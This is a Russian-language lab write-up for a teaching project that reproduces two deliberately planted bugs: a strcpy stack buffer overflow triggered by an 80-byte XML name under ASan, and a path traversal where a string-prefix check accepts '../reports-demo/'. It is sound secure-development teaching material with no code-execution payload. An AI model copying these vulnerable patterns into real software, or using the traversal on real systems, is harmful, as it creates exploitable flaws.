## Переполнение

Буфер вмещает 31 байт имени и NUL. Уже 32 ASCII-символа требуют 33 байта;
для ясного отчёта ASan используется 80. Для UTF-8 считаются байты, а не буквы.
Запись активна для каждого корректно разобранного record. Имя затем печатается,
поэтому копирование не является мёртвым кодом.

Из корня проекта после сборки build-asan:

```bash
lab_tmp=$(mktemp -d)
python3 - "$lab_tmp/overflow.xml" <<'PY'
from pathlib import Path
import sys
Path(sys.argv[1]).write_text(
    '<records><record name="' + 'A' * 80 + '" value="1"/></records>\n'
)
PY
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
  ./build-asan/rbpo_lab < "$lab_tmp/overflow.xml"
```

Ожидается ненулевой статус и отчёт с `stack-buffer-overflow`, `strcpy`,
`addRecord`, записью размером 81 байт. Точный адрес и код shell зависят от ОС.
Проверка через файл эквивалентна: `--input "$lab_tmp/overflow.xml"`.

## Выход за каталог

```bash
project_dir=$(pwd)
lab_tmp=$(mktemp -d)
mkdir "$lab_tmp/reports-demo"
(
  cd "$lab_tmp"
  ASAN_OPTIONS=detect_leaks=0 \
    "$project_dir/build-asan/rbpo_lab" \
    --input "$project_dir/corpus/input1.txt" \
    --output ../reports-demo/proof.txt
  test -f reports-demo/proof.txt
  test ! -e reports/proof.txt
  cat reports-demo/proof.txt
)
```

Создаётся только новый учебный файл во временном каталоге. Получаем:

```text
Count: 2
Sum: 30.00
Average: 15.00
```

Предполагаемая граница: `/tmp/.../reports/`. После канонизации путь становится
`/tmp/.../reports-demo/proof.txt`. Он начинается с `/tmp/.../reports`, поэтому
проверка проходит, хотя файл не внутри reports. Абсолютные пути отвергаются,
но это не предотвращает данный обход. Обычный `../other/proof.txt` будет
отклонён: важно именно совпадение префикса имени соседнего каталога.

ASan не обязан сообщать об этой ошибке. Отсутствие crash ожидаемо:
успешная запись за логическую границу является доказательством CWE-22.
При обычном запуске существующий целевой файл перезаписывается; поэтому
демонстрация специально использует новый каталог, созданный mktemp.

## Границы эксперимента

Не добавлены исполнение команд, сеть, небезопасное форматирование или
намеренная арифметическая ошибка. DTD отклоняются, внешний загрузчик возвращает
nullptr, подстановка сущностей не включается. Вход ограничен 1 MiB, значения
ограничены по модулю, пустой набор не вызывает деления на ноль.
Ошибки сторонней libxml2 рассматриваются отдельно в SCA: старая версия может
иметь и другие CVE, это не дополнительные намеренные ошибки нашего кода.
Демонстрация переполнения ограничена падением под ASan, без payload для
выполнения кода. Исправленной версии в проекте нет.
